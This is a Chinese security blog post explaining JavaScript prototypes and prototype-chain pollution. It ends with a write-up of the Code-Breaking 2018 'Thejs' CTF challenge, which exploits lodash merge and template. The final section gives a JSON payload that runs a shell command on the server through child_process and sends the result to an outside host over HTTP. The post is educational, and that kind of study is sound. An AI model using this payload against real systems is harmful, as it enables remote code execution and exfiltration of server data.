---
layout:     post
title:      JavaScript-原型链污染
subtitle:   __proto__ 与 prototype
date:       2020-04-19
author:     BY Diego
header-img: img/post-bg-java原型链.jpg
catalog: true
tags:
    - JavaScript
    - 原型链污染
---


## 原型 与 原型链

### 类的构造函数

先说一下类的构造函数,'面向对象编程'的第一步，就是要生成对象。而js中面向对象编程是基于构造函数（constructor）和原型链（prototype）的。

“对象”是单个实物的抽象。通常需要一个模板，表示某一类实物的共同特征，然后“对象”根据这个模板生成。

构造函数的本质就是函数 ，因此构造函数的定义与函数类似。

两种方法都可
```javascript
var Test = function() {
    this.test = "ookk";
};

function Test() {
    this.test = "ookk";
}
```

构造函数特点
```javascript
1：构造函数的函数名的第一个字母通常大写。

2：函数体内使用this关键字，代表所要生成的对象实例。

3：生成对象的时候，必须使用new命令来调用构造函数。
```

new 命令的实现过程

```javascript
let a = new Test()

1.创建一个空对象，作为将要返回的对象实例。

2.将空对象的原型指向了构造函数的prototype属性。

3.将空对象赋值给构造函数内部的this关键字。

4.开始执行构造函数内部的代码。
```

### 原型

简单了解完这些就开始 说一下原型 这里涉及 prototype  和 \_\_proto__ 两个概念

用先知上的图
![JuszWD.png](https://s1.ax1x.com/2020/04/19/JuszWD.png)

图中就可以看出每个函数对象都会有个prototype属性，它指向了该构建函数实例化的原型，而实例原型的constructor 又指向了构造函数。**使用该构建函数实例化对象时，会继承该原型中的属性及方法。** 从图中可以看出

```javascript
function Persion(){
    this.test = "abc"
}
persion = new Persion()

```
在浏览器的控制台看一下
![Juy6fO.png](https://s1.ax1x.com/2020/04/19/Juy6fO.png)

Persion 的原型有两个属性 ，一个是 constructor，另一个是__proto__。
Persion.prototype.constructor 又指向了自身
![JuyLcQ.png](https://s1.ax1x.com/2020/04/19/JuyLcQ.png)

![JuWATs.png](https://s1.ax1x.com/2020/04/19/JuWATs.png)
可以认为原型prototype是类Person的一个属性，而所有用Person类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。

我们可以通过Person.prototype来访问Person类的原型，但Person实例化出来的对象，是不能通过prototype访问原型的。这时候，就需要用__proto__。

图中蓝线表示为
```javascript
person.__proto__ -> Persion.prototype
```

**原型有何作用？**

用p神的例子来说

```javascript
function Persion() {
    this.name = "Tom"
    this.show = function() {
        console.log(this.name)
    }
}
(new Foo()).show()
```
当我们新建一个Persion对象时，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。
[![JuI8Wn.png](https://s1.ax1x.com/2020/04/19/JuI8Wn.png)](https://imgchr.com/i/JuI8Wn)
图中很明显show 绑定在 persion对象上的

当我们使用
```javascript
function Persion() {
    this.name = "Tom"
}

Persion.prototype.show = function show() {
    console.log(this.name)
}

let persion = new Persion()
persion.show()
```
从结果来看，show是绑定在persion.\_\_proto__上的，也就是Persion.prototype 原型上的
![JuoC60.png](https://s1.ax1x.com/2020/04/19/JuoC60.png)

这就印证了上面最开始说的 **使用该构建函数实例化对象时，会继承该原型中的属性及方法。**

总的来说
```javascript
1.prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法
2.一个对象的__proto__属性，指向这个对象所在的类的prototype属性
```

### 原型链

所谓原型链也是指JS中的一个继承和反向查找的机制，函数对象可以通过prototype属性找到函数原型，普通实例对象可以通过__proto__属性找到构建其函数的原型。说白了就是寻找原型的一条链

![JuszWD.png](https://s1.ax1x.com/2020/04/19/JuszWD.png)

persion对象的 \_\_proto__ 为Persion.prototype ,而Persion.prototype 的\_\_proto__ 为Object.prototype(对象原型) Object.prototype 的\_\_proto__ 为 null。

这就是一条简单的原型链
![JuTBx1.png](https://s1.ax1x.com/2020/04/19/JuTBx1.png)

举个不恰当的例子 ，就像python中的
![Ju7AJJ.png](https://s1.ax1x.com/2020/04/19/Ju7AJJ.png)

总结一下，对于对象persion，在调用persion.show()的时候，实际上javascript引擎会进行如下操作：

这里再放一张合天的一张图片，加深一下理解
![JuHJNF.jpg](https://s1.ax1x.com/2020/04/19/JuHJNF.jpg)

```javascript
1.在对象persion中寻找show()方法
2.如果找不到，则在persion.__proto__中寻找show()
3.如果仍然找不到，则继续在persion.__proto__.__proto__中寻找show()
4.依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null
```

## 原型链污染

原型链污染主要是因为攻击者可以设置__proto__的值，导致污染，一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。。用户能控制其键名的操作，就容易出现污染攻击，如

```javascript
对象merge
对象clone（其实内核就是将待操作的对象merge到一个空对象中）
```

举一个小例子
```javascript
function User(){
    this.username = "Tom"
}

a = new User()
a.__proto__.is_admin = true

b = new User()
console.log(b.is_admin)
```
![JubqIO.png](https://s1.ax1x.com/2020/04/19/JubqIO.png)


而在实际中 常见的操作是merge 和 clone
```javascript
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}

let a = {aa:"b",b:123}
let b = {bb:"a",c:456}
merge(a,b)
console.log(a)
```
![JuOJq1.png](https://s1.ax1x.com/2020/04/19/JuOJq1.png)

这里有一点值得注意，为何o2没有被污染

![JuXYlQ.png](https://s1.ax1x.com/2020/04/19/JuXYlQ.png)
用JavaScript创建o2的过程（let o1 = {a: 1, "\_\_proto__": {b: 2}}）中，__proto__已经代表o1的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型。
这一点不难理解 ，用程序输出一下便可知道

![JujU3D.png](https://s1.ax1x.com/2020/04/19/JujU3D.png)

因此要实现原型链污染就必须 让__proto__被认为是一个键名
在 **JSON.parse('{"a": 1, "\_\_proto__": {"b": 2}}')** 中则__proto__被认为是一个键名

![JuvZqA.png](https://s1.ax1x.com/2020/04/19/JuvZqA.png)

![JuvVrd.png](https://s1.ax1x.com/2020/04/19/JuvVrd.png)

通过下图可以看出 {}的原型被成功污染

![JuvfJK.png](https://s1.ax1x.com/2020/04/19/JuvfJK.png)

**JSON.parse** 是不是会限制攻击的利用条件？
答案是不会的 因为很多数据传输都是用json来传输的，JSON.parse常用来解析用户传来的信息

危害当然不仅改变属性这么简单,甚至可以改变方法
```javascript
let person = {name: 'lucas'}
person.__proto__.toString = () => {alert('evil')}
let person2 = {}
console.log(person2.toString())
```
![JKldBj.png](https://s1.ax1x.com/2020/04/19/JKldBj.png)

[![JKlRu4.png](https://s1.ax1x.com/2020/04/19/JKlRu4.png)](https://imgchr.com/i/JKlRu4)

## 实例

### Code-Breaking 2018 Thejs 分析

[![JKNXNQ.png](https://s1.ax1x.com/2020/04/19/JKNXNQ.png)](https://imgchr.com/i/JKNXNQ)
将选择的东西 保存在session中的一个功能

```javascript
const fs = require('fs')
const express = require('express')
const bodyParser = require('body-parser')
const lodash = require('lodash')
const session = require('express-session')
const randomize = require('randomatic')

const app = express()
app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())
app.use('/static', express.static('static'))
app.use(session({
    name: 'thejs.session',
    secret: randomize('aA0', 16),
    resave: false,
    saveUninitialized: false
}))
app.engine('ejs', function (filePath, options, callback) { // define the template engine
    fs.readFile(filePath, (err, content) => {
        if (err) return callback(new Error(err))
        let compiled = lodash.template(content)
        let rendered = compiled({...options})

        return callback(null, rendered)
    })
})
app.set('views', './views')
app.set('view engine', 'ejs')

app.all('/', (req, res) => {
    let data = req.session.data || {language: [], category: []}
    if (req.method == 'POST') {
        data = lodash.merge(data, req.body)
        req.session.data = data
    }

    res.render('index', {
        language: data.language,
        category: data.category
    })
})

app.listen(3000, () => console.log(`Example app listening on port 3000!`))
```

用的express 框架， req.body 格式可根据 **Content-Type**修改，如果为json 那么自动将req.body 格式设置为json，就相当于使用了JSON.parse
[![JKUnjx.png](https://s1.ax1x.com/2020/04/19/JKUnjx.png)](https://imgchr.com/i/JKUnjx)

lodash 低版本的 merge是存在原型链污染的
![JKUaKP.png](https://s1.ax1x.com/2020/04/19/JKUaKP.png)

因此条件达成，可以进行污染。可以给Object对象插入任意属性。
此题利用了lodash.template源码中,因为初始sourceURL是没有值的 ，因此通过污染添给加sourceURL加值，而这里是可以执行命令的，具体不细说了

```javascript
var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\n' : '';
// ...
var result = attempt(function() {
  return Function(importsKeys, sourceURL + 'return ' + source)
  .apply(undefined, importsValues);
});
```

构造payload
```javascript
{"__proto__":{"sourceURL":"xxx\r\nvar require = global.require || global.process.mainModule.constructor._load;var result = require('child_process').execSync('cat /flag_thepr0t0js').toString();var req = require('http').request(`http://ip/${result}`);req.end();\r\n"}}
```

![JKdAp9.png](https://s1.ax1x.com/2020/04/19/JKdAp9.png)

监听得到flag
![JKdZOx.png](https://s1.ax1x.com/2020/04/19/JKdZOx.png)


## 参考

[JavaScript 中的构造函数](https://juejin.im/entry/584a1c98ac502e006c5d63b8)

[深入理解 JavaScript Prototype 污染攻击](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)

[浅析javascript原型链污染攻击](https://xz.aliyun.com/t/7182)

[JavaScript Prototype污染攻击](https://zhuanlan.zhihu.com/p/85593346)

[Lodash 严重安全漏洞背后 你不得不知道的 JavaScript 知识](https://blog.fundebug.com/2019/07/20/lodash-security-problem/)
